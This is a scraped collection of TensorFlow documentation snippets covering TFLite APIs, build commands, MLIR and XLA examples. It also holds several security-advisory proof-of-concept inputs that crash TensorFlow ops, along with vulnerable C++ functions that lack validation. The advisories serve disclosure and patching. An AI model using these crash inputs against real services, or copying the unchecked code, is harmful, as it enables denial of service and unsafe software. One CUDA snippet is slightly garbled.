SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-092.md#_snippet_1

LANGUAGE: C++
CODE:
```
TfLiteIntArray* TfLiteIntArrayCreate(int size) {
  TfLiteIntArray* ret = (TfLiteIntArray*)malloc(TfLiteIntArrayGetSizeInBytes(size));
  ret->size = size;
  return ret;
}
```

----------------------------------------

TITLE: Check TFLite BoundingBoxProperties Buffer Identifier Python
DESCRIPTION: Checks if the FlatBuffer buffer at the given offset contains the correct identifier for a `BoundingBoxProperties` object. This is typically used to verify the buffer content before parsing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxProperties.md#_snippet_0

LANGUAGE: Python
CODE:
```
@classmethod
BoundingBoxPropertiesBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Initializing NormalizationOptionsT From Object Python
DESCRIPTION: Initializes a `NormalizationOptionsT` object by copying the data from an existing `normalizationOptions` object. This class method is useful for creating a new instance based on the values of another instance, effectively performing a copy operation. It takes an existing object as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptionsT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    normalizationOptions
)
```

----------------------------------------

TITLE: Getting SentencePiece Model Length Python
DESCRIPTION: This instance method returns the length of the SentencePiece model data field. If the model data is a vector, this would return the number of elements.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptions.md#_snippet_5

LANGUAGE: python
CODE:
```
SentencePieceModelLength()
```

----------------------------------------

TITLE: Comparing ModelHParams Less Than - Python
DESCRIPTION: Performs a less than comparison between this `ModelHParams` instance and another object. This method is typically generated automatically by attribute libraries like `attrs` for ordered comparisons.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/spec/ModelHParams.md#_snippet_5

LANGUAGE: Python
CODE:
```
__lt__(
    other
)
```

----------------------------------------

TITLE: Operator Version Map Entry Format (Conceptual C++)
DESCRIPTION: This snippet shows the required format for adding an entry to the `op_version_map` in `runtime_version.cc`. The map links a specific operator and version (`{BuiltinOperator, version}`) to the minimum TFLite runtime version required to support it (`%CURRENT_RUNTIME_VERSION%`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_version.md#_snippet_10

LANGUAGE: C++
CODE:
```
{{BuiltinOperator_DEPTHWISE_CONV_2D, 2}, %CURRENT_RUNTIME_VERSION%}
```

----------------------------------------

TITLE: Configure Cross-compiled TFLite Kernel Tests (CMake)
DESCRIPTION: Configures CMake for building cross-compiled TensorFlow Lite kernel tests. It combines the toolchain file specification with enabling kernel tests and providing the path to the host-built `flatc` executable necessary for test data generation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_11

LANGUAGE: sh
CODE:
```
cmake -DCMAKE_TOOLCHAIN_FILE=${OE_CMAKE_TOOLCHAIN_FILE} -DTFLITE_KERNEL_TEST=on -DTFLITE_HOST_TOOLS_DIR=<flatc_dir_path> ../tensorflow/lite/
```

----------------------------------------

TITLE: Generating SavedModel for Inspection (Bazel/Shell)
DESCRIPTION: This Bazel command executes the target `:foo` and passes the `--save_model_path` flag to save the generated SavedModel to the specified temporary directory (`/tmp/my.saved_model`). The subsequent comment indicates the path to the serialized protobuf file (`saved_model.pb`) within that directory for manual inspection.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tensorflow/tests/tf_saved_model/README.md#_snippet_2

LANGUAGE: Shell
CODE:
```
bazel run :foo -- --save_model_path=/tmp/my.saved_model
# Inspect /tmp/my.saved_model/saved_model.pb
```

----------------------------------------

TITLE: Build TFLite Debian Package via Docker/Make (Shell)
DESCRIPTION: Uses the `make` tool within a Docker environment to build a TensorFlow Lite Debian package (`.deb`). The `BUILD_DEB=y` variable enables the Debian package build, which is currently supported for Python 3 targets like Raspberry Pi (`rpi`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_5

LANGUAGE: sh
CODE:
```
make BASE_IMAGE=debian:buster PYTHON_VERSION=3.6 TENSORFLOW_TARGET=rpi BUILD_DEB=y docker-build
```

----------------------------------------

TITLE: Constructing TensorFlow Pip Package Bash
DESCRIPTION: Runs the build_pip_package script generated by Bazel inside the Docker container to create the TensorFlow pip package (.whl file). The package is placed in /tf/pkg and includes the --nightly_flag; the --cpu flag is added for CPU builds.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_5

LANGUAGE: Bash
CODE:
```
docker exec tf \
  ./bazel-bin/tensorflow/tools/pip_package/build_pip_package \
  /tf/pkg \
  --cpu \
  --nightly_flag
```

LANGUAGE: Bash
CODE:
```
docker exec tf \
  ./bazel-bin/tensorflow/tools/pip_package/build_pip_package \
  /tf/pkg \
  --nightly_flag
```

----------------------------------------

TITLE: Conditionally Adding GPU Delegate Sources (CMake)
DESCRIPTION: Appends the GPU delegate source file to the source list if the `TFLITE_ENABLE_GPU` CMake option is enabled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/CMakeLists.txt#_snippet_3

LANGUAGE: cmake
CODE:
```
if(TFLITE_ENABLE_GPU)
  list(APPEND TFLITE_LABEL_IMAGE_SRCS
    ${TFLITE_SOURCE_DIR}/tools/delegates/gpu_delegate_provider.cc
  )
endif()  # TFLITE_ENABLE_GPU
```

----------------------------------------

TITLE: Initializing StatsT From Packed Buffer Python
DESCRIPTION: A class method to initialize a `StatsT` object from a buffer (`buf`) containing data in a packed format, starting from an optional position (`pos`, defaulting to 0). This method is specialized for reading data optimized for space efficiency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/StatsT.md#_snippet_3

LANGUAGE: Python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Example Parameter Map C++
DESCRIPTION: Shows the structure of the `std::map<string, std::vector<string>>` used within a transform's context to hold parsed parameters passed from the command line. It demonstrates how parameters with multiple values are stored.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_15

LANGUAGE: C++
CODE:
```
{{"foo", {"a", "b"}}, {"bar", {"2"}}, {"bob", {"1,2,3"}}}
```

----------------------------------------

TITLE: MLIR TPU Input Reordering Pass: Before
DESCRIPTION: This MLIR snippet demonstrates the Intermediate Representation (IR) structure before the `-tf-tpu-reorder-replicate-partitioned-inputs` pass. It shows `tf.TPUPartitionedInput` ops feeding into a single `tf.TPUReplicatedInput` op.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_57

LANGUAGE: MLIR
CODE:
```
!rtype = type tensor<!tf_type.resource<tensor<10x3xf32>>>
func @data_and_model_parallelism(%arg0: !rtype, %arg1: !rtype, %arg2: !rtype, %arg3: !rtype) -> !rtype {
  %pi_0 = "tf.TPUPartitionedInput"(%arg0, %arg1) {_XlaSharding = "", device = "", partition_dim = -1 : i64} : (!rtype, !rtype) -> !rtype
  %pi_1 = "tf.TPUPartitionedInput"(%arg2, %arg3) {_XlaSharding = "", device = "", partition_dim = -1 : i64} : (!rtype, !rtype) -> !rtype
  %ri = "tf.TPUReplicatedInput"(%pi_0, %pi_1) : (!rtype, !rtype) -> !rtype
  return %ri : !rtype
}
```

----------------------------------------

TITLE: Demonstrating Overflow in TensorFlow range (Python)
DESCRIPTION: This Python snippet demonstrates the overflow vulnerability directly in TensorFlow's `tf.range`. Using an extremely large negative value for the `start` parameter causes an incorrect size calculation, which can lead to a crash or overflow in vulnerable TensorFlow versions before the patch.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-194.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.range(start=-1e+38, limit=1)
```

----------------------------------------

TITLE: Invoking TensorGroupStart Function (Python)
DESCRIPTION: This Python snippet demonstrates calling the `TensorGroupStart` function, which is generated from the FlatBuffer schema definition. It is used to mark the beginning of a `TensorGroup` object within a FlatBuffer builder. The `builder` parameter is the active FlatBuffer builder instance where the metadata is being constructed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroupStart.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorGroupStart(
    builder
)
```

----------------------------------------

TITLE: Defining nvidia-cuda-runtime-cu12 Dependency
DESCRIPTION: Specifies the exact version (12.5.82) for the 'nvidia-cuda-runtime-cu12' package and includes multiple SHA256 hashes. This entry defines the required version of the CUDA runtime library for version 12 and ensures its integrity during installation through hash verification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_3

LANGUAGE: Python Requirements
CODE:
```
nvidia-cuda-runtime-cu12==12.5.82 \
    --hash=sha256:0fd5fbca289bceb9f0690aa9858f06187b554fdeb7e2711dfd5bb3ce58900b46 \
    --hash=sha256:3e79a060e126df40fd3a068f3f787eb000fa51b251ec6cd97d09579632687115 \
    --hash=sha256:71f015dbf9df05dd71f7480132c6ebf47a6ceb2ab53d7db8e08e4b30ebb87e14
```

----------------------------------------

TITLE: Implementing and Registering XLA Custom Call on GPU (CUDA)
DESCRIPTION: Shows how to implement an XLA custom call for GPU execution using CUDA. It defines a CUDA kernel `custom_call_kernel` and a CPU-side wrapper function `do_custom_call` that launches the kernel onto a provided CUDA stream. It also demonstrates defining the FFI handler signature including the stream context and registering the handler for the "CUDA" platform.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_16

LANGUAGE: C++/CUDA
CODE:
```
__global__ custom_call_kernel(const float* in0, const float* in1, float* out) {
  size_t idx = blockIdx.x * blockDim.x + threadIdx.x;
  out[idx] = in0[idx % 128] + in1[idx];
}

void do_custom_call(CUstream stream, BufferF32 in0, BufferF32 in1,
                    xla::ffi::Result<BufferF32> out) {
  size_t d0 = in0.dimensions[0];
  size_t d1 = in1.dimensions[0];
  size_t d2 = out->dimensions[0];

  assert(d0 == 128 && d1 == 2048 && d2 == 2048 && "unexpected dimensions");

  const int64_t block_dim = 64;
  const int64_t grid_dim = 2048 / block_dim;
  custom_call_kernel<<<grid_dim, block_dim, 0, stream>>>(n    in0.data, in1.data, out->data);
}

XLA_FFI_DEFINE_HANDLER(handler, do_custom_call,
                       ffi::Ffi::Bind()
                           .Ctx<xla::ffi::PlatformStream<CUstream>>()
                           .Arg<BufferF32>()
                           .Arg<BufferF32>()
                           .Ret<BufferF32>());

XLA_FFI_REGISTER_HANDLER(xla::ffi::GetXlaFfiApi(), "do_custom_call",
                         "CUDA", handler);
```

----------------------------------------

TITLE: Building ReduceWindow Operation with Max Reduction (C++)
DESCRIPTION: Demonstrates how to construct an XLA ReduceWindow computation using XlaBuilder in C++. It first defines a reduction function for finding the maximum value and then applies it within the ReduceWindow operation to a 2D input array, specifying window dimensions, strides, and valid padding.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_28

LANGUAGE: cpp
CODE:
```
// Create a computation for the reduction (maximum).
XlaComputation max;
{
  XlaBuilder builder(client_, "max");
  auto y = builder.Parameter(0, ShapeUtil::MakeShape(F32, {}), "y");
  auto x = builder.Parameter(1, ShapeUtil::MakeShape(F32, {}), "x");
  builder.Max(y, x);
  max = builder.Build().value();
}

// Create a ReduceWindow computation with the max reduction computation.
XlaBuilder builder(client_, "reduce_window_2x3");
auto shape = ShapeUtil::MakeShape(F32, {4, 6});
auto input = builder.Parameter(0, shape, "input");
builder.ReduceWindow(
    input,
    /*init_val=*/builder.ConstantLiteral(LiteralUtil::MinValue(F32)),
    *max,
    /*window_dimensions=*/{2, 3},
    /*window_stride_dimensions=*/{2, 3},
    Padding::kValid);
```

----------------------------------------

TITLE: Rewriting Embedding Ops with Program Key in MLIR
DESCRIPTION: This pass adjusts the graph execution order for embedding operations, particularly on architectures supporting accelerated lookups. It moves embedding ops with the `mini_batch_splits` attribute to execute after a `_TPUCompileMlir` op within `tf_device.launch` blocks, using the compiled program output as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_7

LANGUAGE: MLIR
CODE:
```
"tf_device.launch"() ({
  %cst_0 = "tf.Const"() {value = dense<""> : tensor<1x!tf_type.string>} : () -> tensor<1x!tf_type.string>
  "tf.OpA"(%cst_0) { mini_batch_splits = ""} : (tensor<1x!tf_type.string>) -> ()
  tf_device.return
}) {device = "/job:localhost/replica:0/task:0/device:CPU:0"} : () -> ()
%0:2 = "tf_device.launch"() ({
  %compilation_status, %program = "tf._TPUCompileMlir"() { metadata = "...", mlir_module = "..." } : () -> (tensor<!tf_type.string>, tensor<3x!tf_type.string>)
  tf_device.return %compilation_status, %program : tensor<!tf_type.string>, tensor<3x!tf_type.string>
}) {device = "/job:localhost/replica:0/task:0/device:CPU:0"} : () -> (tensor<!tf_type.string>, tensor<3x!tf_type.string>)
```

LANGUAGE: MLIR
CODE:
```
%0:2 = "tf_device.launch"() ({
    %compilation_status, %program = "tf._TPUCompileMlir"() {metadata = "...", mlir_module = "..."} : () -> (tensor<!tf_type.string>, tensor<3x!tf_type.string>)
    tf_device.return %compilation_status, %program : tensor<!tf_type.string>, tensor<3x!tf_type.string>
  }) {device = "/job:localhost/replica:0/task:0/device:CPU:0"} : () -> (tensor<!tf_type.string>, tensor<3x!tf_type.string>)
  "tf_device.launch"() ({
    %cst = "tf.Const"() {value = dense<""> : tensor<1x!tf_type.string>} : () -> tensor<1x!tf_type.string>
    "tf.OpA"(%0#1) {mini_batch_splits = ""} : (tensor<3x!tf_type.string>) -> ()
    tf_device.return
  }) {device = "/job:localhost/replica:0/task:0/device:CPU:0"} : () -> ()
```

----------------------------------------

TITLE: Defining TensorFlow Sparse Multiplex Op Interface (C++)
DESCRIPTION: This snippet registers the `Examples>MultiplexSparse` operation interface using TensorFlow's `REGISTER_OP` macro. It defines the nine input tensors required to represent three sparse tensors (condition, input `a`, input `b`) using the coordinate list (COO) format, specifies the output sparse tensor (also COO), declares a type attribute `T`, includes a shape inference function that uses `UnknownDim()` for sparse outputs, and provides detailed documentation for the op's behavior and parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_3/README.md#_snippet_0

LANGUAGE: C++
CODE:
```
REGISTER_OP("Examples>MultiplexSparse")
    .Input("cond_indices: int64")
    .Input("cond_values: bool")
    .Input("cond_shape: int64")
    .Input("a_indices: int64")
    .Input("a_values: T")
    .Input("a_shape: int64")
    .Input("b_indices: int64")
    .Input("b_values: T")
    .Input("b_shape: int64")
    .Output("output_indices: int64")
    .Output("output_values: T")
    .Output("output_shape: int64")
    .Attr("T: type")
    .SetShapeFn([](tensorflow::shape_inference::InferenceContext* c) {
      tensorflow::shape_inference::ShapeHandle unused;
      TF_RETURN_IF_ERROR(c->WithRank(c->input(0), 2, &unused));  // cond_indices
      TF_RETURN_IF_ERROR(c->WithRank(c->input(1), 1, &unused));  // cond_values
      TF_RETURN_IF_ERROR(c->WithRank(c->input(2), 1, &unused));  // cond_shape
      TF_RETURN_IF_ERROR(c->WithRank(c->input(3), 2, &unused));  // a_indices
      TF_RETURN_IF_ERROR(c->WithRank(c->input(4), 1, &unused));  // a_values
      TF_RETURN_IF_ERROR(c->WithRank(c->input(5), 1, &unused));  // a_shape
      TF_RETURN_IF_ERROR(c->WithRank(c->input(6), 2, &unused));  // b_indices
      TF_RETURN_IF_ERROR(c->WithRank(c->input(7), 1, &unused));  // b_values
      TF_RETURN_IF_ERROR(c->WithRank(c->input(8), 1, &unused));  // b_shape
      const auto num_rows = c->UnknownDim();
      const auto dense_rank = c->UnknownDim();
      c->set_output(0, c->Matrix(num_rows, dense_rank));
      c->set_output(1, c->Vector(num_rows));
      c->set_output(2, c->Vector(dense_rank));
      return ::tensorflow::OkStatus();
    })
    .Doc(R"doc(
Return elements chosen from `a` or `b` depending on `cond`.

This is similar to `np.where` and `tf.where`, but simplified to only handle
the case of sparse tensors that are vectors, no optional parameters,
no broadcasting, etc.. Elements for `a` are chosen if there is a `true` `cond`
value at the same position. Elements for `b` are chosen if there is not a `true`
`cond` value at the same position, i.e., if either there is a `false` `cond`
value or the `cond` value is not specified.

Indices must be ordered as described by tf.sparse_reorder.

cond_indices: a rank-2 tensor of sparse indices.
cond_values: a rank-1 tensor of sparse values.
cond_shape: a rank-1 tensor representing the dense shape.
a_indices: a rank-2 tensor of sparse indices.
a_values: a rank-1 tensor of sparse values.
a_shape: a rank-1 tensor representing the dense shape.
b_indices: a rank-2 tensor of sparse indices.
b_values: a rank-1 tensor of sparse values.
b_shape: a rank-1 tensor representing the dense shape.
output_indices: a rank-2 tensor of sparse indices.
output_values: a rank-1 tensor of sparse values.
output_shape: a rank-1 tensor representing the dense shape.
)doc");
```

----------------------------------------

TITLE: Defining Operation State and Attributes - C++
DESCRIPTION: Illustrates the C++ structure used to define the state and attributes for a StableHLO operation. The `Attributes` struct maps directly to the operation's attributes defined in the StableHLO specification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/shlo/README.md#_snippet_0

LANGUAGE: C++
CODE:
```
// Operation data.
class ExampleOp {
 public:
  // The attributes are a direct mapping of the StableHLO spec.
  struct Attributes {
    int64_t attribute_one;
    float attribute_two;
  };
};
```

----------------------------------------

TITLE: Checking for Custom Metadata in Python
DESCRIPTION: Checks if the custom metadata field is present or null within the schema. Use this method to verify if custom metadata exists before attempting to access it.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_4

LANGUAGE: python
CODE:
```
CustomMetadataIsNone()
```

----------------------------------------

TITLE: Dumping XLA GPU Autotune Results from a Test (Shell)
DESCRIPTION: These Bazel test parameters show how to configure a test run to dump autotuning results to a file within the test's output directory. The `test_env` flag passes XLA flags via the `XLA_FLAGS` environment variable, and `test_sharding_strategy=disabled` ensures a single cache file is generated for the entire test.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/persisted_autotuning.md#_snippet_2

LANGUAGE: Shell
CODE:
```
--test_env=XLA_FLAGS=--xla_gpu_dump_autotune_results_to=TEST_UNDECLARED_OUTPUTS_DIR/autotune_cache.textproto
--test_sharding_strategy=disabled
```

----------------------------------------

TITLE: Canonicalize Negative Axis - Pseudo-code (C++)
DESCRIPTION: This helper function takes an axis index and the tensor's rank and returns a canonicalized positive axis index. If the input axis is negative, it adds the rank to wrap around to the equivalent positive index.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_2

LANGUAGE: Pseudo-code (C++)
CODE:
```
// Cannonicalize scalar axis attributes to a scalar positive axis attribute
int32 positive_axis(int32 axis, int32 rank)
{
   if (axis < 0)
       axis += rank;

   return axis;
}
```

----------------------------------------

TITLE: Copying Delegate to App Files - ADB Shell
DESCRIPTION: Copies the stable delegate file from the temporary location (`/data/local/tmp/`) to the benchmark app's private files directory (`/data/data/.../files/`) on the device. This is done using `adb shell run-as` to ensure the command has the correct permissions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_7

LANGUAGE: Shell
CODE:
```
adb shell run-as org.tensorflow.lite.benchmark.delegateperformance \
  cp /data/local/tmp/libtensorflowlite_sample_stable_delegate.so \
  /data/data/org.tensorflow.lite.benchmark.delegateperformance/files/
```

----------------------------------------

TITLE: Initializing AssociatedFileT From Buffer Python
DESCRIPTION: A class method to initialize an `AssociatedFileT` object by deserializing from a byte buffer at a specific position. This is typically used when reading FlatBuffers data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFileT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Setting Minimum CMake Version and Project Name - CMake
DESCRIPTION: Specifies the minimum required CMake version for the project and defines the project name as 'tensorflow-lite-c', enabling C and CXX languages.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/c/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
cmake_minimum_required(VERSION 3.16)
project(tensorflow-lite-c C CXX)
```

----------------------------------------

TITLE: Starting ScoreThresholdingOptions Build - TFLite - Python
DESCRIPTION: This function signature demonstrates how to initiate the building process for FlatBuffer data representing ScoreThresholdingOptions. It requires a FlatBuffers builder object as input. This is typically followed by adding fields and finally ending the object construction.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreThresholdingOptionsStart.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.ScoreThresholdingOptionsStart(\n    builder\n)
```

----------------------------------------

TITLE: Getting Configuration in AverageWordVecSpec
DESCRIPTION: Retrieves the current configuration settings of the AverageWordVecSpec instance. Useful for inspecting or saving the model specification parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_4

LANGUAGE: python
CODE:
```
get_config()
```

----------------------------------------

TITLE: Calling StatsEnd Function TFLite Python
DESCRIPTION: This snippet displays the function signature for `StatsEnd`. It accepts a single argument, `builder`, which represents a metadata builder object. The function is typically used to finalize or complete the definition of statistical metadata within the building process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/StatsEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.StatsEnd(
    builder
)
```

----------------------------------------

TITLE: Testing HLO Pass with FileCheck in C++
DESCRIPTION: Demonstrates writing a C++ unit test using Google Test (`TEST_F`) to test an HLO pass. The test embeds HLO IR as a raw string literal (`R"(...)`) with interleaved `// CHECK` lines to validate the pass's output against expected patterns using `FileCheck`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/test_hlo_passes.md#_snippet_0

LANGUAGE: C++
CODE:
```
TEST_F(PriorityFusionTest, FuseBroadcastIntoBitcastConsumers) {
  absl::string_view kHlo = R"(
    HloModule test_module

    // CHECK: ENTRY main
    ENTRY main {
      // CHECK-NEXT: %[[PARAM:.*]] = f32[96]{0} parameter(0)
      param_0 = f32[96]{0} parameter(0)
      broadcast = f32[8,96,128,7]{3,2,1,0} broadcast(param_0), dimensions={1}
      bitcast.6079.2 = f32[8,24,4,128,7]{4,3,2,1,0} bitcast(broadcast)
      // CHECK-NEXT: ROOT %{{.*}} fusion(%[[PARAM]]) {{.*}}
      ROOT transpose.1990.2 = f32[8,24,128,7,4]{4,3,2,1,0} transpose(bitcast.6079.2), dimensions={0,1,3,4,2}
    }
  )";
  RunAndFilecheckHloRewrite(kHlo, std::move(priority_fusion_));
}
```

----------------------------------------

TITLE: Demonstrating TensorListResize Vulnerability with Nonscalar Size - Python
DESCRIPTION: This Python snippet demonstrates how to trigger the denial-of-service vulnerability in `tf.raw_ops.TensorListResize`. It creates a TensorList and attempts to resize it using a nonscalar NumPy array for the `size` parameter, which violates the expected scalar input and results in a `CHECK_EQ` failure within the operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-155.md#_snippet_0

LANGUAGE: python
CODE:
```
import numpy as np
import tensorflow as tf

a = data_structures.tf_tensor_list_new(elements = tf.constant(value=[3, 4, 5]))
b = np.zeros([0, 2, 3, 3])

tf.raw_ops.TensorListResize(input_handle=a, size=b)
```

----------------------------------------

TITLE: Triggering Vulnerability with SparseSplit in TensorFlow (Python)
DESCRIPTION: This Python code snippet shows how a large integer value for a dimension in the `shape` argument of `tf.raw_ops.SparseSplit` can lead to an integer overflow during the creation of a dense tensor shape internally. This overflow triggers a `CHECK`-fail in the TensorFlow kernel, causing a denial of service.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-071.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_layer = 2**60-1
sparse_data = tf.raw_ops.SparseSplit(
    split_dim=1,
    indices=[(0, 0), (0, 1), (0, 2),
    (4, 3), (5, 0), (5, 1)],
    values=[1.0, 1.0, 1.0, 1.0, 1.0, 1.0],
    shape=(input_layer, input_layer),
    num_split=2,
    name=None
    )
```

----------------------------------------

TITLE: Vulnerable Output Size Calculation in TensorFlow C++
DESCRIPTION: This C++ function, `GetOutputSize`, is used internally by TensorFlow's cost estimator to calculate output dimensions for convolution-like operations. It computes the output size based on input, filter, and stride. The vulnerability exists because it lacks validation for the `stride` parameter, allowing a division by zero if `stride` is passed as zero.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-001.md#_snippet_1

LANGUAGE: c++
CODE:
```
int64_t GetOutputSize(const int64_t input, const int64_t filter,
                      const int64_t stride, const Padding& padding) {
  // Logic for calculating output shape is from GetWindowedOutputSizeVerbose()
  // function in third_party/tensorflow/core/framework/common_shape_fns.cc.
  if (padding == Padding::VALID) {
    return (input - filter + stride) / stride;
  } else {  // SAME.
    return (input + stride - 1) / stride;
  }
}
```

----------------------------------------

TITLE: Enabling XNNPACK via Objective-C API on iOS
DESCRIPTION: This snippet illustrates how to enable the XNNPACK delegate using the TensorFlow Lite Objective-C API for iOS. Set the `useXNNPACK` property to `YES` on a `TFLInterpreterOptions` object when initializing the interpreter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/xnnpack/README.md#_snippet_2

LANGUAGE: Objective-C
CODE:
```
TFLInterpreterOptions *options = [[TFLInterpreterOptions alloc] init];
options.useXNNPACK = YES;
NSError *error;
TFLInterpreter *interpreter =
    [[TFLInterpreter alloc] initWithModelPath:@"model/path"
                                      options:options
                                        error:&error];
```

----------------------------------------

TITLE: Packing ProcessUnitT into Builder Python
DESCRIPTION: This instance method packs the current state of the `ProcessUnitT` object into a FlatBuffers builder. It requires a `builder` object as input and is used to serialize the object's data into a format ready to be written to a buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnitT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Checking Equality for TFLite Audio Embedder Options - Python
DESCRIPTION: This snippet presents the signature for the standard Python `__eq__` method, which is used to determine if two instances of the `AudioEmbedderOptions` class are equal. It takes one argument, `other`, which is the object to compare against the current instance. The implementation details for the equality check are not shown here.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioEmbedderOptions.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other
)
```

----------------------------------------

TITLE: Triggering Division by Zero in Conv2DBackpropInput (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a division by zero vulnerability in the `tf.raw_ops.Conv2DBackpropInput` operation. It sets up specific input tensors (`input_sizes`, `filter`, `out_backprop`) with shapes that result in internal calculations leading to division by zero, causing a crash. It requires the TensorFlow library installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-014.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_tensor = tf.constant([52, 1, 1, 5], shape=[4], dtype=tf.int32)
filter_tensor = tf.constant([], shape=[0, 1, 5, 0], dtype=tf.float32)
out_backprop = tf.constant([], shape=[52, 1, 1, 0], dtype=tf.float32)

tf.raw_ops.Conv2DBackpropInput(input_sizes=input_tensor, filter=filter_tensor,
                               out_backprop=out_backprop, strides=[1, 1, 1, 1],
                               use_cudnn_on_gpu=True, padding='SAME',
                               explicit_paddings=[], data_format='NHWC',
                               dilations=[1, 1, 1, 1])
```

----------------------------------------

TITLE: Debugging Specific Trace with MLIR Replay (Shell)
DESCRIPTION: This command directly uses the `mlir_replay` tool to debug a specific compilation trace file (`.mlir-trace.pb`) and its associated input snapshot (`.snapshot.pb`). It executes the intermediate representation after each compiler pass, allowing users to step through the compilation process and identify the pass responsible for introducing a discrepancy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir/tools/mlir_replay/README.md#_snippet_3

LANGUAGE: Shell
CODE:
```
./mlir_replay \
  --mlir-compilation-trace=/tmp/test-dump/module_1234.jit_something.mlir-trace.pb \
  --hlo-snapshot=/tmp/test-dump/module_1234.jit_something.snapshot.56.pb \
  --print-changes-only --stop-after-first-failure
```

----------------------------------------

TITLE: Triggering Crash in tf.strings.substr with Out-of-Bounds Position (Python)
